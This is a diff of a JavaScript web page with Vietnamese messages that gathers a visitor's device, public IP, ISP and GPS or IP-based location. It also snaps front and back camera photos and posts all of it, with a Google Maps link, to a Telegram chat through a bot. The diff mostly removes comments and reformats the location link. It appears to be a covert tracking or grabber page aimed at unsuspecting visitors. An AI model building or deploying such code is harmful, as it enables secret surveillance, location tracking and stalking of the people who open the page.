@@ -17,7 +17,6 @@ const info = {
   camera: '⏳ Đang kiểm tra...'
 };
 
-// ✅ Nhận diện thiết bị
 function detectDevice() {
   const ua = navigator.userAgent;
   if (/iPhone|iPad|iPod/i.test(ua)) {
@@ -39,14 +38,11 @@ function detectDevice() {
   }
 }
 
-// ✅ Lấy IP dân cư
 async function getPublicIP() {
-  const res = await fetch('https://api.ipify.org?format=json');
-  const data = await res.json();
-  info.ip = data.ip || 'Không rõ';
+  const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+  info.ip = ip.ip || 'Không rõ';
 }
 
-// ✅ Lấy IP thật + ISP từ Cloudflare
 async function getRealIP() {
   const ip = await fetch('https://icanhazip.com').then(r => r.text());
   info.realIp = ip.trim();
@@ -54,16 +50,17 @@ async function getRealIP() {
   info.isp = data.connection?.org || 'Không rõ';
 }
 
-// ✅ Lấy vị trí bằng GPS, nếu không được thì fallback IP
+let useGPS = false;
+
 async function getLocation() {
   return new Promise(resolve => {
     if (!navigator.geolocation) return fallbackIPLocation().then(resolve);
 
     navigator.geolocation.getCurrentPosition(
       async pos => {
+        useGPS = true;
         info.lat = pos.coords.latitude.toFixed(6);
         info.lon = pos.coords.longitude.toFixed(6);
-
         try {
           const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`, {
             headers: { 'User-Agent': 'Mozilla/5.0' }
@@ -78,6 +75,7 @@ async function getLocation() {
         resolve();
       },
       async () => {
+        useGPS = false;
         await fallbackIPLocation();
         resolve();
       },
@@ -86,7 +84,6 @@ async function getLocation() {
   });
 }
 
-// ✅ Lấy vị trí từ IP nếu GPS bị từ chối
 async function fallbackIPLocation() {
   const data = await fetch(`https://ipwho.is/`).then(r => r.json());
   info.lat = data.latitude?.toFixed(6) || '0';
@@ -95,7 +92,6 @@ async function fallbackIPLocation() {
   info.country = data.country || 'Không rõ';
 }
 
-// ✅ Chụp ảnh camera
 function captureCamera(facingMode = 'user') {
   return new Promise((resolve, reject) => {
     navigator.mediaDevices.getUserMedia({ video: { facingMode } })
@@ -120,8 +116,11 @@ function captureCamera(facingMode = 'user') {
   });
 }
 
-// ✅ Caption gửi về Telegram
 function getCaption() {
+  const mapsLink = info.lat && info.lon
+    ? `https://maps.google.com/?q=${info.lat},${info.lon}`
+    : 'Không rõ';
+
   return `
 📡 [THÔNG TIN TRUY CẬP]
 
@@ -135,12 +134,11 @@ function getCaption() {
 🌎 Quốc gia: ${info.country}
 📍 Vĩ độ: ${info.lat}
 📍 Kinh độ: ${info.lon}
-📌 Bản đồ: https://www.google.com/maps?q=${info.lat},${info.lon}
+📌 Vị trí Google Maps: ${mapsLink}
 📸 Camera: ${info.camera}
 `.trim();
 }
 
-// ✅ Gửi ảnh về Telegram
 async function sendPhotos(frontBlob, backBlob) {
   const formData = new FormData();
   formData.append('chat_id', TELEGRAM_CHAT_ID);
@@ -154,7 +152,6 @@ async function sendPhotos(frontBlob, backBlob) {
   return fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
 }
 
-// ✅ Gửi text nếu không chụp được ảnh
 async function sendTextOnly() {
   return fetch(API_SEND_TEXT, {
     method: 'POST',
@@ -166,7 +163,6 @@ async function sendTextOnly() {
   });
 }
 
-// ✅ Khởi chạy
 async function main() {
   detectDevice();
   await getPublicIP();
